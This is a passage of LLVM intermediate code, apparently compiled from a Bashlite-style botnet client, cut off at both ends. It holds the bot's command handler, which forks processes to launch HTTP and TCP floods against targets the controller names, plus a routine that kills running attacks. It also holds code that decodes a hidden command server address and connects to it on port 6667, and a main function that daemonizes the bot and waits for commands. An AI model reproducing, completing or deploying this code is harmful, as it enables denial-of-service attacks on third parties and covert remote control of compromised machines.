  %202 = icmp slt i32 %0, 3
  br i1 %202, label %346, label %203

; <label>:203:                                    ; preds = %201
  %204 = getelementptr inbounds i8*, i8** %1, i64 2
  %205 = load i8*, i8** %204, align 8
  %206 = tail call i32 @atoi(i8* %205) #15
  %207 = icmp slt i32 %206, 1
  br i1 %207, label %346, label %208

; <label>:208:                                    ; preds = %203
  %209 = getelementptr inbounds i8*, i8** %1, i64 1
  %210 = load i8*, i8** %209, align 8
  %strchr162 = tail call i8* @strchr(i8* %210, i32 44)
  %211 = icmp eq i8* %strchr162, null
  br i1 %211, label %224, label %212

; <label>:212:                                    ; preds = %208
  %213 = load i32, i32* @mainCommSock, align 4
  %214 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %213, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i64 0, i64 0), i8* %210, i32 %206)
  br label %215

; <label>:215:                                    ; preds = %218, %212
  %.sink167 = phi i8* [ %210, %212 ], [ null, %218 ]
  %216 = tail call i8* @strtok(i8* %.sink167, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #5
  %217 = icmp eq i8* %216, null
  br i1 %217, label %.loopexit170.loopexit, label %218

; <label>:218:                                    ; preds = %215
  %219 = tail call i32 @listFork()
  %220 = icmp eq i32 %219, 0
  br i1 %220, label %221, label %215

; <label>:221:                                    ; preds = %218
  tail call void @sendHTTP(i8* %210, i32 %206)
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = tail call i32 @close(i32 %222) #5
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:224:                                    ; preds = %208
  %225 = tail call i32 @listFork()
  %226 = icmp eq i32 %225, 0
  br i1 %226, label %227, label %346

; <label>:227:                                    ; preds = %224
  %228 = load i32, i32* @mainCommSock, align 4
  %229 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %228, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i64 0, i64 0), i8* %210, i32 %206)
  tail call void @sendHTTP(i8* %210, i32 %206)
  %230 = load i32, i32* @mainCommSock, align 4
  %231 = tail call i32 @close(i32 %230) #5
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit170.loopexit:                            ; preds = %215
  br label %.loopexit170

.loopexit170:                                     ; preds = %.loopexit170.loopexit, %.loopexit171
  %232 = load i8*, i8** %1, align 8
  %233 = tail call i32 @strcmp(i8* %232, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i64 0, i64 0)) #15
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %235, label %.loopexit

; <label>:235:                                    ; preds = %.loopexit170
  %236 = icmp slt i32 %0, 6
  br i1 %236, label %346, label %237

; <label>:237:                                    ; preds = %235
  %238 = getelementptr inbounds i8*, i8** %1, i64 3
  %239 = load i8*, i8** %238, align 8
  %240 = tail call i32 @atoi(i8* %239) #15
  %241 = icmp eq i32 %240, -1
  br i1 %241, label %346, label %242

; <label>:242:                                    ; preds = %237
  %243 = getelementptr inbounds i8*, i8** %1, i64 2
  %244 = load i8*, i8** %243, align 8
  %245 = tail call i32 @atoi(i8* %244) #15
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %346, label %247

; <label>:247:                                    ; preds = %242
  %248 = getelementptr inbounds i8*, i8** %1, i64 4
  %249 = load i8*, i8** %248, align 8
  %250 = tail call i32 @atoi(i8* %249) #15
  %251 = icmp eq i32 %250, -1
  %252 = icmp sgt i32 %250, 32
  %or.cond168 = or i1 %251, %252
  br i1 %or.cond168, label %346, label %253

; <label>:253:                                    ; preds = %247
  %254 = icmp sgt i32 %0, 6
  br i1 %254, label %255, label %.thread

; <label>:255:                                    ; preds = %253
  %256 = getelementptr inbounds i8*, i8** %1, i64 6
  %257 = load i8*, i8** %256, align 8
  %258 = tail call i32 @atoi(i8* %257) #15
  %259 = icmp slt i32 %258, 0
  br i1 %259, label %346, label %260

; <label>:260:                                    ; preds = %255
  %261 = icmp eq i32 %0, 8
  br i1 %261, label %262, label %.thread

; <label>:262:                                    ; preds = %260
  %263 = getelementptr inbounds i8*, i8** %1, i64 7
  %264 = load i8*, i8** %263, align 8
  %265 = tail call i32 @atoi(i8* %264) #15
  %266 = icmp slt i32 %265, 1
  br i1 %266, label %346, label %.thread

.thread:                                          ; preds = %253, %262, %260
  %267 = phi i1 [ true, %262 ], [ false, %260 ], [ false, %253 ]
  %268 = getelementptr inbounds i8*, i8** %1, i64 1
  %269 = load i8*, i8** %268, align 8
  %270 = load i8*, i8** %243, align 8
  %271 = tail call i32 @atoi(i8* %270) #15
  %272 = load i8*, i8** %238, align 8
  %273 = tail call i32 @atoi(i8* %272) #15
  %274 = load i8*, i8** %248, align 8
  %275 = tail call i32 @atoi(i8* %274) #15
  %276 = getelementptr inbounds i8*, i8** %1, i64 5
  %277 = load i8*, i8** %276, align 8
  br i1 %267, label %278, label %282

; <label>:278:                                    ; preds = %.thread
  %279 = getelementptr inbounds i8*, i8** %1, i64 7
  %280 = load i8*, i8** %279, align 8
  %281 = tail call i32 @atoi(i8* %280) #15
  br label %282

; <label>:282:                                    ; preds = %.thread, %278
  %283 = phi i32 [ %281, %278 ], [ 10, %.thread ]
  br i1 %254, label %284, label %288

; <label>:284:                                    ; preds = %282
  %285 = getelementptr inbounds i8*, i8** %1, i64 6
  %286 = load i8*, i8** %285, align 8
  %287 = tail call i32 @atoi(i8* %286) #15
  br label %288

; <label>:288:                                    ; preds = %282, %284
  %289 = phi i32 [ %287, %284 ], [ 0, %282 ]
  %strchr163 = tail call i8* @strchr(i8* %269, i32 44)
  %290 = icmp eq i8* %strchr163, null
  br i1 %290, label %303, label %291

; <label>:291:                                    ; preds = %288
  %292 = load i32, i32* @mainCommSock, align 4
  %293 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %292, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i64 0, i64 0), i8* %269, i32 %273)
  br label %294

; <label>:294:                                    ; preds = %297, %291
  %.sink169 = phi i8* [ %269, %291 ], [ null, %297 ]
  %295 = tail call i8* @strtok(i8* %.sink169, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #5
  %296 = icmp eq i8* %295, null
  br i1 %296, label %.loopexit.loopexit, label %297

; <label>:297:                                    ; preds = %294
  %298 = tail call i32 @listFork()
  %299 = icmp eq i32 %298, 0
  br i1 %299, label %300, label %294

; <label>:300:                                    ; preds = %297
  tail call void @sendTCP(i8* nonnull %295, i32 %271, i32 %273, i32 %275, i8* %277, i32 %289, i32 %283)
  %301 = load i32, i32* @mainCommSock, align 4
  %302 = tail call i32 @close(i32 %301) #5
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:303:                                    ; preds = %288
  %304 = tail call i32 @listFork()
  %305 = icmp eq i32 %304, 0
  br i1 %305, label %306, label %346

; <label>:306:                                    ; preds = %303
  %307 = load i32, i32* @mainCommSock, align 4
  %308 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %307, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.67, i64 0, i64 0), i8* %269, i32 %273)
  tail call void @sendTCP(i8* %269, i32 %271, i32 %273, i32 %275, i8* %277, i32 %289, i32 %283)
  %309 = load i32, i32* @mainCommSock, align 4
  %310 = tail call i32 @close(i32 %309) #5
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit.loopexit:                               ; preds = %294
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit170
  %311 = load i8*, i8** %1, align 8
  %312 = tail call i32 @strcmp(i8* %311, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0)) #15
  %313 = icmp eq i32 %312, 0
  br i1 %313, label %.preheader, label %341

.preheader:                                       ; preds = %.loopexit
  %314 = load i64, i64* @numpids, align 8
  %315 = icmp eq i64 %314, 0
  br i1 %315, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

._crit_edge.thread:                               ; preds = %.preheader
  %316 = load i32, i32* @mainCommSock, align 4
  br label %338

.lr.ph:                                           ; preds = %.lr.ph.preheader, %330
  %.0179 = phi i64 [ %331, %330 ], [ 0, %.lr.ph.preheader ]
  %.0154178 = phi i32 [ %.1, %330 ], [ 0, %.lr.ph.preheader ]
  %317 = load i32*, i32** @pids, align 8
  %318 = getelementptr inbounds i32, i32* %317, i64 %.0179
  %319 = load i32, i32* %318, align 4
  %320 = icmp eq i32 %319, 0
  br i1 %320, label %330, label %321

; <label>:321:                                    ; preds = %.lr.ph
  %322 = tail call i32 @getpid() #5
  %323 = icmp eq i32 %319, %322
  br i1 %323, label %330, label %324

; <label>:324:                                    ; preds = %321
  %325 = load i32*, i32** @pids, align 8
  %326 = getelementptr inbounds i32, i32* %325, i64 %.0179
  %327 = load i32, i32* %326, align 4
  %328 = tail call i32 @kill(i32 %327, i32 9) #5
  %329 = add nsw i32 %.0154178, 1
  br label %330

; <label>:330:                                    ; preds = %321, %.lr.ph, %324
  %.1 = phi i32 [ %329, %324 ], [ %.0154178, %321 ], [ %.0154178, %.lr.ph ]
  %331 = add i64 %.0179, 1
  %332 = load i64, i64* @numpids, align 8
  %333 = icmp ult i64 %331, %332
  br i1 %333, label %.lr.ph, label %._crit_edge

._crit_edge:                                      ; preds = %330
  %334 = icmp sgt i32 %.1, 0
  %335 = load i32, i32* @mainCommSock, align 4
  br i1 %334, label %336, label %338

; <label>:336:                                    ; preds = %._crit_edge
  %337 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %335, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.69, i64 0, i64 0), i32 %.1)
  br label %341

; <label>:338:                                    ; preds = %._crit_edge.thread, %._crit_edge
  %339 = phi i32 [ %316, %._crit_edge.thread ], [ %335, %._crit_edge ]
  %340 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %339, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i64 0, i64 0))
  br label %341

; <label>:341:                                    ; preds = %.loopexit, %336, %338
  %342 = load i8*, i8** %1, align 8
  %343 = tail call i32 @strcmp(i8* %342, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i64 0, i64 0)) #15
  %344 = icmp eq i32 %343, 0
  br i1 %344, label %345, label %346

; <label>:345:                                    ; preds = %341
  tail call void @exit(i32 0) #17
  unreachable

; <label>:346:                                    ; preds = %341, %303, %224, %190, %118, %79, %39, %235, %237, %242, %247, %255, %262, %201, %203, %129, %131, %136, %141, %146, %155, %90, %92, %97, %51, %53, %58, %30, %45, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #0 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #5
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i8* @decode(i8* %13)
  %15 = call i8* @strcpy(i8* nonnull %2, i8* %14) #5
  %16 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %17 = icmp eq i8* %16, null
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %7
  %19 = getelementptr inbounds i8, i8* %16, i64 1
  %20 = call i32 @atoi(i8* %19) #15
  store i8 0, i8* %16, align 1
  br label %21

; <label>:21:                                     ; preds = %7, %18
  %.0 = phi i32 [ %20, %18 ], [ 6667, %7 ]
  %22 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %22, i32* @mainCommSock, align 4
  %23 = call i32 @connectTimeout(i32 %22, i8* nonnull %2, i32 %.0, i32 30)
  %24 = icmp eq i32 %23, 0
  %. = zext i1 %24 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #5
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.72, i64 0, i64 0)) #5
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #5
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #5
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i64 0, i64 0), i32 0) #5
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #5
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #5
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #5
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #5
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #3

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readnone) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %8 = tail call i32 @getpid() #5
  %9 = xor i32 %8, %7
  tail call void @srand(i32 %9) #5
  %10 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %11 = tail call i32 @getpid() #5
  %12 = xor i32 %11, %10
  tail call void @init_rand(i32 %12)
  %13 = tail call i32 @getOurIP()
  %14 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), align 1
  %15 = zext i8 %14 to i32
  %16 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 1), align 1
  %17 = zext i8 %16 to i32
  %18 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 2), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 3), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 4), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 5), align 1
  %25 = zext i8 %24 to i32
  %26 = tail call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.76, i64 0, i64 0), i32 %15, i32 %17, i32 %19, i32 %21, i32 %23, i32 %25)
  %27 = tail call i32 @fork() #5
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %31, label %29

; <label>:29:                                     ; preds = %2
  %30 = call i32 @waitpid(i32 %27, i32* nonnull %3, i32 0) #5
  call void @exit(i32 0) #17
  unreachable

; <label>:31:                                     ; preds = %2
  %32 = tail call i32 @fork() #5
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %35, label %34

; <label>:34:                                     ; preds = %31
  tail call void @exit(i32 0) #17
  unreachable

; <label>:35:                                     ; preds = %31
  %36 = tail call i32 @setsid() #5
  %37 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i64 0, i64 0)) #5
  %38 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %40 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %41 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge80

.backedge80:                                      ; preds = %.backedge80.backedge, %35
  %42 = call i32 @initConnection()
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %46, label %44

; <label>:44:                                     ; preds = %.backedge80
  %puts72 = call i32 @puts(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @str.1, i64 0, i64 0))
  %45 = call i32 @sleep(i32 5) #5
  br label %.backedge80.backedge

.backedge80.backedge:                             ; preds = %44, %._crit_edge110
  br label %.backedge80

; <label>:46:                                     ; preds = %.backedge80
  %47 = load i32, i32* @mainCommSock, align 4
  %48 = call i32 (i32, i8*, ...) @sockprintf(i32 %47, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i64 0, i64 0))
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = call i32 @recvLine(i32 %49, i8* nonnull %39, i32 4096)
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %._crit_edge110, label %.preheader79.preheader

.preheader79.preheader:                           ; preds = %46
  br label %.preheader79

.preheader79:                                     ; preds = %.preheader79.preheader, %.backedge
  %52 = phi i32 [ %107, %.backedge ], [ %50, %.preheader79.preheader ]
  %53 = load i64, i64* @numpids, align 8
  %54 = icmp eq i64 %53, 0
  br i1 %54, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %.preheader79
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %97
  %indvars.iv = phi i64 [ %indvars.iv.next, %97 ], [ 0, %.lr.ph96.preheader ]
  %55 = load i32*, i32** @pids, align 8
  %56 = getelementptr inbounds i32, i32* %55, i64 %indvars.iv
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @waitpid(i32 %57, i32* null, i32 1) #5
  %59 = icmp sgt i32 %58, 0
  br i1 %59, label %.preheader, label %97

.preheader:                                       ; preds = %.lr.ph96
  %60 = add nuw i64 %indvars.iv, 1
  %61 = load i64, i64* @numpids, align 8
  %62 = icmp ult i64 %60, %61
  %63 = load i32*, i32** @pids, align 8
  %64 = trunc i64 %indvars.iv to i32
  br i1 %62, label %.lr.ph87.preheader, label %._crit_edge88

.lr.ph87.preheader:                               ; preds = %.preheader
  %65 = trunc i64 %60 to i32
  %66 = trunc i64 %indvars.iv to i32
  br label %.lr.ph87

.lr.ph87:                                         ; preds = %.lr.ph87.preheader, %.lr.ph87
  %67 = phi i32* [ %76, %.lr.ph87 ], [ %63, %.lr.ph87.preheader ]
  %68 = phi i64 [ %73, %.lr.ph87 ], [ %60, %.lr.ph87.preheader ]
  %.06786 = phi i32 [ %.067, %.lr.ph87 ], [ %65, %.lr.ph87.preheader ]
  %.067.in85 = phi i32 [ %.06786, %.lr.ph87 ], [ %66, %.lr.ph87.preheader ]
  %69 = getelementptr inbounds i32, i32* %67, i64 %68
  %70 = load i32, i32* %69, align 4
  %71 = zext i32 %.067.in85 to i64
  %72 = getelementptr inbounds i32, i32* %67, i64 %71
  store i32 %70, i32* %72, align 4
  %.067 = add i32 %.06786, 1
  %73 = zext i32 %.067 to i64
  %74 = load i64, i64* @numpids, align 8
  %75 = icmp ult i64 %73, %74
  %76 = load i32*, i32** @pids, align 8
  br i1 %75, label %.lr.ph87, label %._crit_edge88.loopexit

._crit_edge88.loopexit:                           ; preds = %.lr.ph87
  br label %._crit_edge88

._crit_edge88:                                    ; preds = %._crit_edge88.loopexit, %.preheader
  %.067.in.lcssa = phi i32 [ %64, %.preheader ], [ %.06786, %._crit_edge88.loopexit ]
  %.lcssa = phi i32* [ %63, %.preheader ], [ %76, %._crit_edge88.loopexit ]
  %77 = zext i32 %.067.in.lcssa to i64
  %78 = getelementptr inbounds i32, i32* %.lcssa, i64 %77
  store i32 0, i32* %78, align 4
  %79 = load i64, i64* @numpids, align 8
  %80 = add i64 %79, -1
  store i64 %80, i64* @numpids, align 8
  %81 = shl i64 %79, 2
  %82 = call noalias i8* @malloc(i64 %81) #5
  %83 = bitcast i8* %82 to i32*
  %84 = icmp eq i64 %80, 0
  %85 = load i32*, i32** @pids, align 8
  br i1 %84, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %._crit_edge88
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %.lr.ph92
  %86 = phi i32* [ %95, %.lr.ph92 ], [ %85, %.lr.ph92.preheader ]
  %87 = phi i64 [ %92, %.lr.ph92 ], [ 0, %.lr.ph92.preheader ]
  %.16890 = phi i32 [ %91, %.lr.ph92 ], [ 0, %.lr.ph92.preheader ]
  %88 = getelementptr inbounds i32, i32* %86, i64 %87
  %89 = load i32, i32* %88, align 4
  %90 = getelementptr inbounds i32, i32* %83, i64 %87
  store i32 %89, i32* %90, align 4
  %91 = add i32 %.16890, 1
  %92 = zext i32 %91 to i64
  %93 = load i64, i64* @numpids, align 8
  %94 = icmp ult i64 %92, %93
  %95 = load i32*, i32** @pids, align 8
  br i1 %94, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %.lr.ph92
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %._crit_edge88
  %.lcssa81 = phi i32* [ %85, %._crit_edge88 ], [ %95, %._crit_edge93.loopexit ]
  %96 = bitcast i32* %.lcssa81 to i8*
  call void @free(i8* %96) #5
  store i8* %82, i8** bitcast (i32** @pids to i8**), align 8
  br label %97

; <label>:97:                                     ; preds = %.lr.ph96, %._crit_edge93
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %98 = ashr exact i64 %sext, 32
  %99 = load i64, i64* @numpids, align 8
  %100 = icmp ult i64 %98, %99
  br i1 %100, label %.lr.ph96, label %._crit_edge97.loopexit

._crit_edge97.loopexit:                           ; preds = %97
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %.preheader79
  %101 = sext i32 %52 to i64
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %101
  store i8 0, i8* %102, align 1
  call void @trim(i8* nonnull %39)
  %strncmp = call i32 @strncmp(i8* nonnull %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %103, label %109

; <label>:103:                                    ; preds = %._crit_edge97
  %104 = load i32, i32* @mainCommSock, align 4
  %105 = call i32 (i32, i8*, ...) @sockprintf(i32 %104, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph109
  br label %.backedge

.backedge.loopexit130:                            ; preds = %.preheader111
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit130, %.backedge.loopexit, %._crit_edge106.thread, %103, %._crit_edge106, %111, %143
  %106 = load i32, i32* @mainCommSock, align 4
  %107 = call i32 @recvLine(i32 %106, i8* nonnull %39, i32 4096)
  %108 = icmp eq i32 %107, -1
  br i1 %108, label %._crit_edge110.loopexit, label %.preheader79

; <label>:109:                                    ; preds = %._crit_edge97
  %strncmp70 = call i32 @strncmp(i8* nonnull %39, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i64 0, i64 0), i64 3)
  %cmp71 = icmp eq i32 %strncmp70, 0
  br i1 %cmp71, label %110, label %111

; <label>:110:                                    ; preds = %109
  call void @exit(i32 0) #17
  unreachable

; <label>:111:                                    ; preds = %109
  %112 = load i8, i8* %39, align 16
  %113 = icmp eq i8 %112, 33
  br i1 %113, label %.preheader111.preheader, label %.backedge

.preheader111.preheader:                          ; preds = %111
  br label %.preheader111

.preheader111:                                    ; preds = %.preheader111.preheader, %115
  %.065 = phi i8* [ %116, %115 ], [ %40, %.preheader111.preheader ]
  %114 = load i8, i8* %.065, align 1
  switch i8 %114, label %115 [
    i8 0, label %.backedge.loopexit130
    i8 32, label %117
  ]

; <label>:115:                                    ; preds = %.preheader111
  %116 = getelementptr inbounds i8, i8* %.065, i64 1
  br label %.preheader111

; <label>:117:                                    ; preds = %.preheader111
  store i8 0, i8* %.065, align 1
  %118 = call i64 @strlen(i8* %40) #15
  %119 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %118
  %120 = getelementptr inbounds i8, i8* %119, i64 2
  br label %121

; <label>:121:                                    ; preds = %126, %117
  %122 = call i64 @strlen(i8* %120) #15
  %123 = add i64 %122, -1
  %124 = getelementptr inbounds i8, i8* %120, i64 %123
  %125 = load i8, i8* %124, align 1
  switch i8 %125, label %.preheader77.preheader [
    i8 13, label %126
    i8 10, label %126
  ]

.preheader77.preheader:                           ; preds = %121
  br label %.preheader77

